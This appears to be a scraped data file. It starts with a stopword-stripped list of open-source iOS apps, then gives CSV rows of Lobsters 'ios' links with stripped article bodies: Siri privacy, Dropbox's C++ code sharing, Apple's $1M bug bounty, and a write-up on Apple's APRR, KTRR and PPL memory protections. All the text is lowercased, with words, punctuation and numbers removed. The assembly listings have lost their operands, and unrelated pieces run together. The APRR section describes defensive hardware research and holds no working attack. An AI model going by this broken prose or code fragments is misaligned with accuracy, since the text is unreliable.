apple example code swift added april license tictactoe demonstrate build full moderately complex application composable architecture swift added may license mit scan back top security back top dnscloak override secure dns query app store objc cordova added september license easy diceware passphrase generator swift added june license mit screenshot port http everywhere force link use http app store swift added may license icepa systemwide vpn based tor client swift tor added september license keyacid secure easy crypto everyone swift carthage libsodium added august license screenshot screenshot keybase app store react native added february license krypton generate store ssh key phone app store swift added may license screenshot screenshot screenshot screenshot lockdown firewall device app store swift http lockdownhqcom added august license screenshot outline vpn designed use outline server software fully compatible shadowsocks server cordova http getoutlineorgenhome added april license passepartout userfriendly openvpn app app store swift mbprogresshud added september license screenshot screenshot screenshot screenshot screenshot pgpro pgp en decryption app store swift http pgproapp added october license screenshot screenshot screenshot screenshot prey track lost stolen device perform action remotely app store objc http preyprojectcom added june license screenshot screenshot screenshot screenshot screenshot prey track lost stolen device perform action remotely swift http preyprojectcom added june license protonmail encrypted email app store swift iphone ipad dompurify afnetworking flanimatedimage http protonmailcom added june license screenshot screenshot screenshot screenshot simplelogin protect email alias share extension help create alias fly without leaving favorite browser app store swift http simpleloginio added may license mit screenshot tofu authenticator easytouse twofactor authentication app store swift added april license isc screenshot tutanota endtoend encrypted email app store javascript cordova iphone ipad http tutanotacom added june license screenshot screenshot screenshot screenshot vpn extension turn vpn app store swift added march license mit screenshot wireguard wireguard fast modern secure vpn tunnel le battery consumption openvpn app store swift added july license mit screenshot screenshot password back top authenticator simple twofactor authentication clean ui app store swift http mattrubinmeauthenticator added march license mit screenshot screenshot screenshot bitwarden easy way individual team business organization store share sync sensitive data app store csharp http bitwardencom added june license screenshot einmal minimalistic secure twofactor authentication reactnative added may license screenshot encryptr zeroknowledge cloudbased ewallet password manager app store cordova grunt node http spideroakcomencryptr added june license screenshot screenshot screenshot screenshot screenshot freeotp authenticator twofactor authentication app store swift moa added march license screenshot keepassium keepasscompatible password manager support automatic database synchronization respect privacy premium user experience app store swift http keepassiumcom added july license screenshot screenshot screenshot masterpassword stateless password management solution app store objc added may license screenshot screenshot screenshot screenshot screenshot minikeepass secure password manager objc added february license screenshot screenshot screenshot screenshot padlock minimalist open source password manager javascript cordova iphone ipad http padlocapp added april license screenshot screenshot screenshot screenshot pas client pas command line app http wwwpasswordstoreorg app store swift carthage keychainaccess onetimepassword http mssungithubiopassforios added may license mit screenshot screenshot screenshot screenshot passdrop keepass password manager app store openssl added july license screenshot screenshot screenshot screenshot raivo otp lightweight secure onetimepassword otp app store swift added may license screenshot strongbox safe client keepasspassword app store objc http strongboxsafecom added september license screenshot screenshot screenshot screenshot shopping back top good living guide home snack gift beauty shopping swift added august license mit screenshot mojilist create shopping list emojis swift alamofire realm added may license openshopio ecommerce shopping app store objc added april license mit screenshot screenshot screenshot screenshot screenshot wave jeep marketplace place jeep owner buy sell jeep part app store swift jeep jeepparts wave marketplace added february license mit screenshot screenshot screenshot screenshot woocommerce manage order receive sale notification view key metric app store swift added october license screenshot social back top aozora discover track anime swift added february license mit ello ello creator network app store swift added june license mit screenshot screenshot screenshot screenshot screenshot mamoot mastodon twitter swift swiftui ipad macos added july license peggsite app sharing social board objc added march license post manager postschedule twitter post like buffer includes share extension swift node added july license screenshot screenshot screenshot potter pic harry potter themed social network similar instagram swift firebase added january screenshot queue music realtime votable democratized music queue ipad iphone using spotify swift http wwwqueuedappcom added april license screenshot screenshot screenshot spotifyradar never miss new release favorite spotify artist swift iphone ipad spotify spotifyradar rxswift coordinator mvvm added june license mit screenshot tweetledumb mock dumb twitter app swift added june license mastodon http joinmastodonorg back top task back top log community service hour cloud parse added april license screenshot screenshot screenshot screenshot ecortex manage organize thought idea custom category app store swift added january screenshot screenshot screenshot screenshot screenshot firetodo simple todo using swiftui firebase redux swift swiftui firebase redux added may license mit screenshot habitica habit building productivity app store objc http habiticacomstatichome added june license screenshot screenshot screenshot screenshot planc minimalistic todo list swift added august license screenshot realmtodo small todo list realm integration swift added july license swiftuitodo swift swiftui added april license mit screenshot tinylog minimal todo swift iphone ipad added january license mit todo swift added november license screenshot screenshot viperswift todo list swift added november license mit screenshot text back top note back top fsnotes note manager app store swift added may license mit screenshot screenshot screenshot screenshot screenshot joplin note taking todo synchronisation capability app store reactnative http joplinapporg added january license mit screenshot jotify quick note taking app store swift ipad added june license screenshot loose leaf take note import annotate pdfs manipulate imported photo intuitive gesture app store ipad pdf apple pencil added january license mit screenshot majorkey fastest way add note email inbox swift added january license mit screenshot simplememo sync note evernote objc added august license mit simplenote keep note list idea sync cloud includes sharing note collaboration app store fabric crashlytics http simplenotecom added august license screenshot standard note note app focus longevity portability privacy app store reactnative added january license screenshot thoughtless quickly jot thought support markdown swift swifthexcolors cfalertviewcontroller added june license mit screenshot timer back top travel back top californication discover best point interest california swift added august license mit screenshot conjugar learn practice spanish verb tense app store swift added march license mit screenshot screenshot screenshot screenshot screenshot flight search flutter dart added august license mit metrictime display metric time pranking friend trip country use metric system swift added may license screenshot screenshot screenshot smart traveller uberguide simple comfortable way explore city uber api added january license mit screenshot themoji use emojis communicate traveling objc http themojime added july license screenshot tourism demo backed redux show animation internationalization clippath font flutter dart redux added august license screenshot travel guide flutter added may license screenshot visitbcn city guide barcelona app store objc added march license mit screenshot screenshot screenshot screenshot screenshot weather back top lucid weather clock precipitation clock swift dark sky api forecast api added january license mit screenshot nearbyweather current weather nearby station list map detail view app store swift javascript sqlite openweathermap added march license mit screenshot screenshot screenshot newsappwithswiftuiandcombine swift swiftui combine added april license mit screenshot pocket forecast swift typhoon added march license simpleweather swift iglistkit openweathermap added july license screenshot screenshot screenshot smileweather wunderground api openweathermap api added august license mit screenshot sol wunderground api added june license mit screenshot screenshot swiftlanguageweather swift added march license mit screenshot temperatureatlas us apple map combined openweather api swift added june license mit tropos weather app store dark sky api forecast api reactivecocoa added june license mit screenshot screenshot yocelsius objc added june license screenshot misc back top call spend minute make call calling effective way influence representative app store swift pantry added february license mit screenshot screenshot screenshot screenshot screenshot altstore alternate app store jailbreak required swift nuke keychainaccess http altstoreio license screenshot blogquest alternative tumblr client objc added march license mit screenshot bookstoreios browse http itbookstore example pattern unitui testing handling resultoptionals writing documentation swift added august license mit screenshot screenshot borrowed book manage ufrgsbr library book swift alamofire added march license screenshot screenshot carddecks configurable card deck objc added april license mit screenshot clip clipboard manager monitor clipboard indefinitely background swift added june license unlicense screenshot cutthenotch create illusion hide notch swift added february license mit screenshot deckrocket deckset presentation swift iphone added march license mit screenshot emoncms emoncms dashboard app store swift added march license mit screenshot screenshot fakefbwall generate fake facebook wall swift added april license screenshot fontcase install favorite font device able use apps like page number keynote app store objc added april license mit screenshot forcesketch swift added october license screenshot freerdp implementation remote desktop protocol rdp app store objc http wwwfreerdpcom added june license screenshot screenshot screenshot screenshot hackfoldr share project document link app store objc http hackfoldrorg added july license mit screenshot screenshot icopypasta pasteboard feed swift added february license mit screenshot screenshot ladybug handle rdar link gracefully app store swift added july license mit screenshot screenshot screenshot libreoffice remote impress interact libreoffice slideshows remotely app store objc added june license screenshot screenshot screenshot screenshot screenshot location lost movie scene finder swift added april license mit screenshot screenshot screenshot screenshot madbike bicimad app style design app store clone coredata firebase fitness location news weather http wwwmadbikeappcom added september license screenshot screenshot screenshot screenshot mirror minimalist mirror swift added january license mit screenshot microcode emulator app store objc added february license screenshot screenshot screenshot screenshot octopod octoprint app swift starscream chart license screenshot ooniprobe detect internet censorship test network speed app store toast added february license screenshot screenshot screenshot screenshot screenshot phonetic add phonetic key chinese name swift added february license mit screenshot plumometer weigh plum small fruit swift added october license screenshot recipe showcase many recipe together detail information swift added august license screenshot remote remote ir device swift added august license screenshot say name raise awareness injustice often forgotten name racial inequality includes catalog verified donation petition link app store swift added june license mit screenshot science journal use sensor mobile device perform science experiment swift protobuf added march license screenshot screenshot screenshot screenshot slidden customizable keyboard objc added november license mit screenshot susi ai artificial intelligence personal assistant robot help desk chatbots swift added march license screenshot screenshot screenshot triangledraw create logo typography graphic using nothing triangle app store swift ipad iphone metal uidocument apple pencil http wwwtriangledrawcom added january license mit screenshot vinylogue lastfm app store objc added january license screenshot screenshot screenshot appcelerator back top core data back top firebase http firebasegooglecom back top californication discover best point interest california swift added august license mit screenshot chaty anonymous messaging realtime data sync swift firebase websocket nosql added may license mit screenshot falcon messenger fast beautiful cloudbased messaging app app store swift firebase added june license screenshot screenshot screenshot screenshot howmuch record much thing cost parse firebase realm added october license mit screenshot messenger audiovideo call realtime chat full offline support objc firebase onesignal realm added july license screenshot screenshot potter pic harry potter themed social network similar instagram swift firebase added january screenshot quick chat realtime chat swift firebase added january license mit screenshot quickstart sample objc added may license realtime chat firebase added november license screenshot flutter http flutterdev back top flutter dart added april license mit cinereel flutter dart added august license screenshot coronavirustrackerflutter flutter dart added april license mit screenshot flight search flutter dart added august license mit flutter news app flutter dart added april license screenshot fluttermovie browse movie flutter dart tmdb added july license screenshot gmail clone flutter dart added april license mit screenshot grocery shopping flutter dart added june license screenshot invoice ninja http wwwinvoiceninjacom flutter dart added july license newsline flutter dart added may license screenshot spacex go spacex launch tracker flutter dart added august license screenshot tourism demo backed redux show animation internationalization clippath font flutter dart redux added august license screenshot travel guide flutter added may license screenshot ionic http ionicframeworkcom back top macos cross platform project back top bikeshare jetpack compose swiftui based kotlin multiplatform sample project using citybikes api swift kotlin swiftui macos jetpack added august license mit corona tracker coronavirus tracker map chart swift http coronatrackersamaboxcom added march license screenshot delta math helper quickly solve math problem algorithm save time checking homework studying test app store swift macos ipad added april license screenshot screenshot screenshot screenshot fruta create shared codebase build multiplatform app offer widget app clip wwdc sample code apple swift widgetkit macos appclip added june license hacker news multiplatform swift macos added august license mit mamoot mastodon twitter swift swiftui ipad macos added july license mean medium swift swiftui macos added july license milestone count day upcoming milestone swift swiftui combine macos added may license mit screenshot movieswiftui browse movie made swiftui combine moviedb swift swiftui themoviedb combine ipad macos added june license screenshot redditswiftui crossplatform reddit client swift swiftui macos watchos added april license mit screenshot stackov stack overflow app store swift swiftui ipad macos added july license mit screenshot parse http enwikipediaorgwikiparse company back top react native http facebookgithubioreactnative back top day react native demo react native added august license mit screenshot ar cut paste cut paste surroundings using ar reactnative arkit added march license mit artist use relay access artsy graphql api react native graphql added february license mit screenshot artsy art world pocket app store iphone ipad reactnative typescript added january license mit screenshot assembly developerfocused meetup clone react native added may license screenshot screenshot screenshot bp passport simple patient fast free software clinician manage patient hypertension reactnative added july license mit screenshot bristol pound simple convenient way pay bristol pound supporting local business app store reactnative added march license mit screenshot b√≠√≥h√∫si√∞ see movie showtime iceland app store react native added february license screenshot screenshot screenshot screenshot screenshot calculator react native calculator react native added march license mit screenshot canada covid alert app store reactnative added august license mit screenshot den view house sale northwest react native added may license mit screenshot dribbble react native dribbble added june license mit screenshot official app react native added april license screenshot finance system stock app written react native react native added july license mit screenshot gitify brings github notification pocket reactnative added july license mit screenshot gitpoint github app minimal beautiful ui app store reactnative added july license mit screenshot screenshot haiti guam puerto rico wyoming pathcheck safeplaces exposure notification contract tracing app store reactnative added august license mit screenshot iceland help analyse individual travel trace movement case infection arise app store reactnative http wwwcovidisappis added april license mit screenshot israel hamagen exposure prevention app app store reactnative added april license mit screenshot itunes catalog search react native added june license screenshot jitsi meet video meeting everyone app store reactnative added may license screenshot keybase app store react native added february license matchimalsfun animal matching puzzle card game app store reactnative ipad added november license mit screenshot screenshot screenshot screenshot mattermost secure messaging platform devops team app store reactnative added may license screenshot screenshot screenshot screenshot moonwalk simple way stay date upcoming space launch app store reactnative added march license mit screenshot movement watch tracker track accuracy mechanical watch app store reactnative coreml pytorch added march license screenshot movieapp discover movie tv show react native tmdb added november license mit screenshot nba allyoop nba game score react native added january license mit screenshot nbareact nba stats standing react native added july license mit newswatch news based youtube playlist react native added may license screenshot nortal techday react native added may license mit screenshot screenshot pokedb clean simple pok√©dex app pok√©mon go app store reactnative added september license screenshot screenshot screenshot screenshot screenshot pokemonmap locate pokemon around react native added september license mit pokevision display pok√©mon around react native goradar added september license screenshot property finder react native added april license screenshot react native hacker news app store reactnative added march license mit screenshot reviewery rate song spotify playlist reactnative added april license mit screenshot rntester showcase react native view module react native added february license screenshot royal news reactnative added april license mit screenshot r reader react native added june license screenshot snowflake reactnative starter appboilerplateexample redux rn router jest snowflake hapi server running locally redhat openshift backend parse server running locally remotely heroku reactnative redux added february license mit screenshot list react native added june license list redux us redux managing app state react native redux added june license mit screenshot twitch react native added february license screenshot weather jakelin react native added may license mit screenshot weather jsphkhan react native http githubcomjsphkhanreactnativeexamplestreemasteriosweatherapp added may license mit screenshot screenshot screenshot wwdc family react native easily connect fellow developer wwdc reactnative added april license screenshot realm http realmio back top done todo list data sharing extension main app swift realm watchkit added may license mit screenshot element secure decentralised chatvoip app store swift objc webrtc ipad cmark http elementio added july license screenshot facemotion find contact face recognition opencv added july license mit screenshot howmuch record much thing cost parse firebase realm added october license mit screenshot test app simple crm app built using library let quickly generate crud io app based data model swift realm added december screenshot screenshot screenshot screenshot screenshot screenshot screenshot screenshot screenshot screenshot screenshot screenshot screenshot screenshot screenshot obƒõd√°≈ô daily menu restaurant near czech technical university swift alamofire swiftyjson added june license mit screenshot screenshot popular movie crossplatform app discovering recent popular movie swift realm alamofire tmdb added january license mit screenshot screenshot raceme run tracking ghosting swift parse added july license screenshot realmtodo small todo list realm integration swift added july license santa tracker swift realm added may license screenshot try swift nyc swift toucan realm added november license screenshot screenshot try swift tokyo swift timepiece realm kingfisher acknowlist added february license screenshot screenshot swiftui back top swiftui written swiftui swift swiftui added march license mit screenshot ac helper animal crossing new horizon item catalogue app store swift swiftui ipad added april license screenshot accountbook track expense app store swift swiftui added august license mit screenshot anitime anime schedule korean subtitle swift swiftui combine added july license mit asetimerswiftui countdown swift swiftui added may license screenshot astronomy picture day apod swift swiftui combine added july license mit screenshot beer list beer fetched punk api http punkapicom swiftui added june license mit screenshot bikeshare jetpack compose swiftui based kotlin multiplatform sample project using citybikes api swift kotlin swiftui macos jetpack added august license mit blogidealistswiftui using core data swiftui swift swiftui coredata added august license carbode barcode scanner swift swiftui added july license mit screenshot corona virus tracker advice swift swiftui added march license mit screenshot swiftui demo data news swift swiftui combine added april license screenshot currency converter swift added june license screenshot divrise elegant dividend yield income tracker swiftui dividend income tracker added june license mit screenshot screenshot screenshot dub dub todo list swift added june license screenshot emitron http wwwraywenderlichcom swift swiftui combine added july license expense tracker swift swiftui coredata added april license screenshot fingerspelling practice american sign language asl fingerspelling app store swift swiftui combine added april license mit screenshot firetodo simple todo using swiftui firebase redux swift swiftui firebase redux added may license mit screenshot freetimepicker find free time calendar swift swiftui combine added april license mit screenshot fruta create shared codebase build multiplatform app offer widget app clip wwdc sample code apple swift widgetkit macos appclip added june license ftc scorer skystone simple yet powerful way scoring practice match swift added june license mit screenshot githubsearchwithswiftui search github swift swiftui combine added april license mit screen
118,Lobsters,ios,Apple iOS,"Siri, Privacy, and Trust",https://daringfireball.net/2019/08/siri_privacy_trust,siri privacy trust,siri privacy trust alex hern reported matthew panzarino report techcrunch apple literally advertises basis userfocused privacy policy sam byford report verge amazon faq web still far perfect speaking privacy back kara swisher walt mossberg conference,siri privacy trust friday august three week ago writing guardian alex hern reported apple contractor regularly hear confidential medical information drug deal recording couple sex part job providing quality control grading company siri voice assistant guardian learned although apple explicitly disclose consumerfacing privacy documentation small proportion siri recording passed contractor working company around world tasked grading response variety factor including whether activation voice assistant deliberate accidental whether query something siri could expected help whether siri response appropriate apple say data used help siri dictation understand better recognise say company explicitly state work undertaken human listen pseudonymised recording poohpoohed story first mostly ground thought knew recording saved user consented mistaken privacy fiasco betrayal siri user trust week later apple issued statement techcrunch verge stating suspending grading program matthew panzarino report techcrunch apple say review process us called grading determine whether siri hearing query correctly invoked mistake addition issuing software update future let siri user choose whether participate grading process reading last week used siri way recording might used grading process graded apple privacy trust implication give f think debatable whether user voice assistant recording listened even reviewed text form human employee without express consent especially user siri given apple prominent position privacy focused company apple literally advertises basis userfocused privacy policy apparently billboard read happens iphone stay iphone except siri recording listen sam byford report verge apple comment whether addition pausing program contractor listen siri voice recording would also stop actually saving recording server currently company say keep recording six month removing identifying information copy could keep two year optin process crystal clear apple delete existing recording confirm longer saving even know start fact story broke keeping copy identifying information six month defies everyone expectation privacy voice assistant expect apple lead industry front fact far behind amazon faq written plain language explains alexa work view voice recording alexapowered device review alexa app setting alexa privacy pretty obvious location web setting page also option use voice recording improve amazon service develop new feature think amazon make clear turned recording may listened amazon employee hard surmise going apple offer setting offer absolutely way know siri recording saved review employee something explicit precise control instead completely black box control insight whatsoever privacy perspective two fundamental type siri interaction purposeful accidental purposeful interaction press side button say hey siri intention invoking siri accidental interaction occur button pressed long accidentally device incorrectly hears hey siri even though said thing recorded siri interaction treated apple extraordinary care accidental invocation identified deleted immediately unless user expressly agreed allow every time apple contractor listen random conversation audio nightmare scenario alwayslistening voice assistant compare contrast io transcript feature voicemail bottom transcription io asks whether transcription useful useful tap either get explicit prompt help improve transcription would like submit voicemail apple improve transcription accuracy recording used improve quality speech recognition apple product submit recording believe speaker would uncomfortable submitting content apple two button bottom prompt cancel submit must address prompt every single time flag transcription useful useful every time addition correctly respectful privacy voicemail transcription feature also put user control voicemail transcribed poorly flag submit apple would great feature siri interaction go poorly know interaction innocuous term revealing anything private able flag submit apple firmly believe siri gotten far useful far accurate last year clearly still far perfect happy help apple submitting failed interaction perinteraction basis apple need stop pretending siri perfect give final word steve job speaking privacy back kara swisher walt mossberg conference privacy mean people know signing plain english repeatedly believe people smart people want share data people ask ask every time make tell stop asking get tired asking let know precisely going data say better
119,Lobsters,ios,Apple iOS,The (not so) hidden cost of sharing code between iOS and Android,http://blogs.dropbox.com/tech/2019/08/the-not-so-hidden-cost-of-sharing-code-between-ios-and-android/,hidden cost sharing code io android,irbnb sunset use r eact n ative overhead custom framework library jinni nn overhead custom development environment overhead addressing difference platform overhead training hiring retaining developer join team,recently dropbox technical strategy mobile sharing code io android via c idea behind strategy code c instead twice java objective c adopted c strategy back mobile engineering team relatively small needed support fast growing mobile roadmap needed find way leverage small team quickly ship lot code android io completely backed strategy favor using platform native language primarily swift kotlin exist started decision due hidden cost associated code sharing thing learned company cost effectively share code stem basic issue writing code nonstandard fashion took overhead would worry stayed widely used platform default overhead ended expensive writing code twice breaking different type overhead encountered like clarify never actually got point codebase developed c overhead c adoption actually prevented u ever moving fully direction also worth noting much larger company like google facebook developing scalable codesharing solution several year solution far gained limited adoption avoid overhead described leveraging party code sharing solution like react native flutter still apply least one technology gain traction mature example airbnb sunset use react native many reason outlined post group different type overhead faced four main category overhead custom framework library easiest overhead predict c need build framework library roughly break subcategories framework would allow u interact host environment build full fledged mobile app example djinni tool generating crosslanguage type declaration interface binding framework running task background v main thread trivial task perform platform native language library would replace language defaultsopen source standard could used within platform native language example json de serialization nn nonnullable pointer c none code would necessary stayed platform native language contribution open source project would probably benefited developer platform native language possible could done better job leveraging open source c library open source culture c development community still strong mobile development community particular almost nonexistent c mobile community note cost particularly high c opposed possible nonnative language like python c lack single fullfeatured standard library said cc language compiler supported google apple using different language would created whole host problem deal overhead custom development environment mobile ecosystem lot tooling available make development efficient mobile ides rich google apple invested lot resource making best development experience developer corresponding platform moving away platform default gave away benefit notably debugging experience platform native language generally superior debugging c code via platform default ide one particularly memorable example bug causing deadlock background threading framework leading app randomly crash type bug hard pin even work simple standard stack issue involved debugging multithreaded code running back forth c java took week nail addition losing tool also invest time building tool would support c code sharing importantly needed custom build system created library containing c code well java objectivec wrapper could generate target understood xcodebuild gradle system big drag resource needed constantly updated support change two build system overhead addressing difference platform even though io android apps mobile apps generally expose feature functionality platform difference affect implementation example way application execute background task platform different even thing started fairly similar adopted crossplatform strategy greatly diverged time eg interaction camera roll result even really write code run different platform box spend lot time integrating code different platform writing platform specific code sometime code end c layer make theoretical benefit writing code live promise thus greatly reducing benefit approach begin overhead training hiring retaining developer last definitely least cost training andor hiring developer work custom stack dropbox started mobile strategy core group experienced c developer group started c project trained mobile developer dropbox contribute codebase time developer moved team company engineer remained sufficient experience fill technical leadership gap opened became increasingly difficult hire replacement senior engineer relevant c experience would interested mobile development result ended real lack critical expertise maintain c codebase way restore expertise invest substantially one two option find hire candidate specific skillset tried hire role year success train mobile c engineer inhouse missing skillset practically impossible longer someone desired skillset perform training even core group moved mobile engineer generally interested learning c finding people train big issue well top hiring problem rolling tech stack created retention developer simply want work c project caused lot talented mobile engineer leave project rather slog notverywell maintained custom stack general mobile development community technology pattern emerge frequently adopted quickly best developer like keep skill date keeping latest greatest challenge mature product environment standard stack sacrifice adoption speed stability challenge hugely magnified lock custom stack wider mobile ecosystem although writing code sound like great bargain associated overhead made cost approach outweigh benefit turned smaller expected anyway end longer share mobile code via c nonstandard way instead write code platform native language addition want engineer delightful experience able contribute back community made decision align practice industry standard hiring android io engineer get excited building amazing product contributing mobile ecosystem come join team
120,Lobsters,ios,Apple iOS,Apple Confirms $1 Million Reward For Anyone Who Can Hack An iPhone,https://www.forbes.com/sites/thomasbrewster/2019/08/08/apple-confirms-1-million-reward-for-hackers-who-find-serious-iphone-vulnerabilities/,apple confirms million reward anyone hack iphone,reported monday million iphone hack,apple offering million anyone hack iphone chesnotgetty image apple massively increased amount offering hacker finding vulnerability iphones mac million far highest bug bounty offer major tech company fall program open researcher previously company inviteonly bug bounty program eligible receive reward forbes reported monday apple also launching mac bug bounty confirmed thursday also extending watchos apple tv operating system announcement came la vega black hat conference apple head security engineering ivan krstiƒá gave talk io macos security forbes also revealed monday apple give bug bounty participant developer device let hacker dive io instance pause processor look happening data memory krstiƒá confirmed io security research device program would application arrive next year million iphone hack full million go researcher find hack core zero click required iphone owner another given find network attack requiring user interaction also bonus hacker find weakness software released apple increasing reward face increasingly profitable private market hacker sell information government vast sum maor shwartz told forbes cost single exploit program us vulnerability typically take control computer phone fetch much millon exploit targeting whatsapp click required user instance sold government agency much though tool rare one two year sold pool around researcher focus highend hacking really hard research produce working exploit said previously company called zerodium vocal much pay researcher handing unknown government customer january secretive company announced offering million remote hack iphone krstiƒá said bug bounty success date serious bug reported since launch
121,Lobsters,ios,Apple iOS,APRR - of Apple hardware secrets,https://siguza.github.io/APRR/,aprr apple hardware secret,aprr introduction writeup ktrr torn detail brandon azad ivan krstiƒá behind scene io mac security ktrr amended citation needed thing called ppl already covered detailed writeup jonathan levin new jit block blackhat talk slide enter aprr reference manual big enlightenment mitigation gone rogue pentesting aprr digging deeper conclusion open ticket ping twitter thanks windknown qwerty sparkey,siguza aug aprr apple hardware secret introduction almost year ago writeup ktrr first introduced apple chip series course last year good bit talk well confusion new mitigation shipped apple one big change pac already torn detail brandon azad gon na leave left cover aprr aprr certainly biggest chunk hence title post people attended typhooncon seoul year already got see research earlier stage everyone else get slide separate note apple head security engineering ivan krstiƒá return blackhat u year talk titled behind scene io mac security bit io sure sound interesting bit abstract caught eye also discus previouslyundisclosed vm permission page protection technology part overall io code integrity architecture let see change previouslyundisclosed status shall p ktrr amended read ktrr post poked bit kernel chance something caught attention lastpinst lost lot instruction entirety lastpinst msr ret msr ret msr ret msr ret msr spsel ret msr ret msr ret msr ret msr spsel ret msr ret msr ret msr ret instruction exist anywhere else kernel order executable reset sure enough go looking missing one find scattered throughout kernel apparently entirely unprotected apple scatterbrained time scatterbrained citation needed thing try jump instruction writing happens panic cpu caller undefined kernel instruction debugger message panic memory id o version kernel version darwin kernel version tue aug pdt root kernel uuid iboot version secure boot yes paniclog version kernel slide kernel text base epoch time sec usec boot sleep wake calendar faulting instruction ask bad news aarm hexswap msr instruction wanted run make lot sense think chip designer point view though reason apple longer stuff instruction lastpinst upgraded silicon provide much stronger guarantee one hold even leave instruction mistake pull cache magic inject flip switch make instruction undefined altogether looking settcr setmmuttbalternate tell u exactly switch find searching instruction settcr eor lsr cbnz mr cbnz msr isb ret setmmuttbalternate dsb sy mr cbnz msr isb ret contain something public xnu source namely read register jump away certain bit set place jump call panic string attempt set locked register pretty clear message searching access brings u snippet run part reset code isb mov mov orr msr isb ret get value code tell u two code setting contains register check assuming controlled bit bit fairly confident serf slightly finegrained purpose one register used lastpinst talked yet thing instruction writing made undefined fact register actively written exception handler coming mr tbnz orr orr orr msr isb tbnz bit sloppy check assumption kernel integrity fine basically kernel check enia bit control whether pacia instruction noops set set bit enia enda endb happening three five pac key disabled userland apps would otherwise crash horribly ib key disabled used stack frame local function thus issue key need reenabled entry kernel actually writeable would make interesting target since control mmu turned would allow u run shellcode course simple even jump instruction writes make unset bit turn mmu simply turn wildly assuming bit register come appears certain bit locked others remain writeable gone test bit exactly one available gadget uncomfortable use two know pac bit writeable bit rest bit quite frankly much interest interest question whether remains writeable could used unlock register answer course also instruction writing made undefined part register value simply change anymore assuming also controlled bit might obvious research area gone great detail far hope eventually find time revisit register question update post accordingly clear though register purpose lock register wanting specific lockdown register skimmed spec place register grouped together narrow group encompassing vmsa virtual memory system architecture lack better name propose called side note seems exist register name chip older exhibit entirely different behaviour seem affect vmsa register feel like also note another register introduced numbering put three ktrr register msr msr mov msr mov msr written right middle ktrr lockdown sequence would suggest part ktrr admit idea value mean written thing called ppl register last section seems neither gotten public attention affected exploitation got lot attention course pac part spec fairly public seems treated big thing new securitywise beginning seemed really strong brandon azad discovered design flaw two really hold motivated attacker anymore came yet another thing one humble opinion real killer ppl basically kernel bunch new segment lc mem ppltext lc mem ppltramp lc mem ppldataconst lc mem ppldata course apple tell u acronym ppl stand anyone blackhat willing annoy ivan p update stand page protection layer stop u taking apart anyone postexploitation undoubtedly come across ppl already bunch memory patch used work fine earlier namely trust cache injection page table patch make kernel panic kernel data abort ie insufficient memory permission thing though kernel definitely still write memory somehow try track code find access happen inside ppltext would appear though code privileged somehow course invoke since also panic time instruction fetch abort course go track code call ppltext reveal invocation go ppltramp point two area interest one dive kind code exists ppl part exposed trampoline invoke privileged mode work underlying hardware primitive make ppl segment special point already covered detailed writeup jonathan levin encourage read want know gist bunch interesting thing page table trust cache see jonathan post accessible privileged mode thus remain protected even face attacker normal kernel rwx might seem like adding another layer hacked find reduction attack surface actually huge start counting page iphone xr kernel random example one handy page textexec mere page ppltext visualisation page table equally critical thing freely needlessly accessible entire red part green part really required access make sense lock addition locking page table foil plan newbie hacker thought really smart upon time far good point point really something gotten zero public mention surprised learn barely anyone know seems researched private well granted required exploitation consider interesting nevertheless going logically two part make privileged mode switch flipped entry exit ppltext attribute make ppl segment stand rest former found ppltramp right top entryexit routine mr daif msr daifset movk lsl movk lsl movk lsl movk msr isb msr daifset movk lsl movk lsl movk lsl movk mr cmp bne movk lsl movk lsl movk lsl movk msr isb latter found page table permission shown kerneluser note permission apply ppl segment also data dynamically allocated ppl obviously ppl page really permission page table entry say real permission like unprivileged normal mode get flipped privileged ppl mode dive work though look something else something publicly torn something memory access permission new jit block tale start could different ivan krstiƒá blackhat talk part jit helpful graphic showing jit implemented including io image blatantly stolen slide would change io info go check talk going forward assume know work nice well year later release apple moved back unified jit region little caveat rather fully rwx proprietary system register would control whether region currently rw rx jitemitting code would access configure register accordingly one jitemitting code look follows taken xr jsc simply one handy movk movk lsl movk lsl movk lsl ldr msr isb movk movk lsl movk lsl movk lsl ldr mr cmp bne mov mov mov bl ldrb cbz movk movk lsl movk lsl movk lsl ldr msr isb movk movk lsl movk lsl movk lsl ldr mr cmp beq brk system register question get value hardcoded address commpage outside range userland code allowed map memory value set kernel commpagepopulate obviously part care public xnu source find assembly though looking xrefs string commpage far function referencing see something like mov movk lsl movk lsl movk lsl csel xzr eq mov movk lsl movk lsl movk lsl csel xzr eq strb ldr str ldr str point jit ppl look kinda similar work give away brings u punch line post enter aprr release rumour userland ktrr coming called aprr happened let write already know ppl page table weirdly missing uxn bit would make executable standard implementation entry exit ppl change entry exit jitemitting code change pretty much speculation heard matter apple simply repurposed uxn page table bit somehow technical level true interesting notion get back later register value everyone talked simply treated magical constant first clue digit value none would make either odd choice big coincidence random constant second clue encoding space register located two register ktrr register well register found get written leaf u register note used ppl get value used jit mean two register seen yet let keep eye shall also referring register simply last digit brevity eg register one yet see alright find aprr well could simply search instruction operating register let introduce hightech hacking tool called string kernel fgrep aprr invalid aprr index start p end p aprrindex u expectedindex u pmappageprotect modifying aprr mapping ptep p pmap p prot option u pvh p pvehp p pvep p llx llx llx ppnum x pmappageprotect creating aprr mapping ptep p pmap p prot option u pvh p pvehp p pvep p llx llx llx ppnum x unsupported aprr index llu pte llx bad tell u quite bit one seems pmappageprotect deal aprr go check second two something bit inconspicuous sound like aprr index mind let dive assembly mr mr mr lsr bfxil bfxil lsl orr xzr movk lsl movk lsl eor orr wzr lsl tst bne mov movk lsl movk lsl movk lsl eor tst bne orr wzr lsl tst beq lo behold two system register said seen yet thought actually lied seen already lastpinst bit moot since zero context looking part pmappageprotectinternal function part yet public source obviously inlined pmappageprotect tte entered page table happening top register read bit mashing finally branch panic resulting value zero bit mashing interested translated c code would probably look really ugly put word three simple action register value xor ed constant number constructed tte form ap pxn uxn value leftshifted number time four used mask xor ed value last bullet point particularly interesting precisely describes concept register indexing familiar reference manual least one good example know page long story short translation table entry attrindx field bit ie value used index register get attr field since field register make field bit wide precisely happening aprr difference instead index one hence register field bit wide left register indexed bit differently index field seem bit wide rather nice property value translates exactly one digit hexadecimalbinary tell u register layout still know meaning individual field might helpful collect value somehow used register collection value description register register register register xor ed pmappageprotect assigned cpu reset assigned cpu reset ppl entry ppl exit process jit disabled process jit enabled process jit disabled process jit enabled jit region rw jit region rx something else take possible index write permission would normally give u used tte index kernel access userland access rwx x rwx rw x rw rwx rwx rwx rw rw rwx rw rw rx x rx r x r rx rx rx r r rx r r take value index row let take example value us enteringexiting ppl well reg value index krnusr reg ppl entry reg ppl exit changed reg rwx x rwx rw x rw rwxrwx rwxrw rwrwx rwrw rx x rx r x r rxrx rxr r rx r r let first look reg value marked two digit change entryexit 